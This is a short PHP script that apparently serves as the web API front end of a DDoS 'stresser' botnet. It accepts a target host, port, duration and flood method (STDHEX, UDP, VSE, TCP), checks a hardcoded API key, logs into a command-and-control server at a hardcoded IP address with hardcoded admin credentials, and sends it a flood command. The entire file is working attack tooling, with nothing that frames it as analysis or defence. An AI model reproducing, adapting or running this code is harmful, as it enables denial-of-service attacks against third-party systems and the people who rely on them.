<?php
//API Link: https://api.realstresser.com/layer4/botnetapi.php?host=[host]&port=[port]&time=[time]&method=[method]&apikey=realstresserisgodxd
set_time_limit(0);

$server = "51.68.65.174";
$conport = 8899;
$username = "Admin";
$password = "Ad666";
$key = "realstresserisgodxd"; //For only stresser :)

$activekeys = array();
$methods = array("STDHEX", "UDP", "VSE", "TCP");

$method = $_GET['method'];
$target = $_GET['host'];
$port = $_GET['port'];
$time = $_GET['time'];
$apikey = $_GET['apikey'];

if($method == "" && $target == "" && $port == "" && $time == "" && $apikey == "")
	die("Please control parameters!");

if($apikey != $key)
	die("Invalid API Key!");
	
if($method == "STDHEX"){$command = "!* STDHEX $target $port $time";}
else if($method == "UDP"){$command = "!* UDP $target $port $time 32 65500 10";}
else if($method == "VSE"){$command = "!* VSE $target $port $time 32 65500 10";}
else if($method == "TCP"){$command = "!* TCP $target $port $time 32 65500 10";}
else {
	if (!in_array($method, $methods)) { die("Invalid attack method!"); } }
$sock = fsockopen($server, $conport, $errno, $errstr, 2);

if(!$sock){
        echo "Couldn't Connect To CNC Server!";
} else{
        //print(fread($sock, 512)."\n");
        fwrite($sock, $username . "\n");
        //echo "<br>";
        //print(fread($sock, 512)."\n");
        fwrite($sock, $password . "\n");
        //echo "<br>";
        if(fread($sock, 512)){
                //print(fread($sock, 512)."\n");
        }

        fwrite($sock, $command . "\n");
        fclose($sock);
        //echo "<br>";
        //echo "> $command ";
		echo "Attack has been sent successfully!";
		echo "<br>";
		echo "Target: $target | Port: $port | Time: $time | Method: $method";
}
		  
?>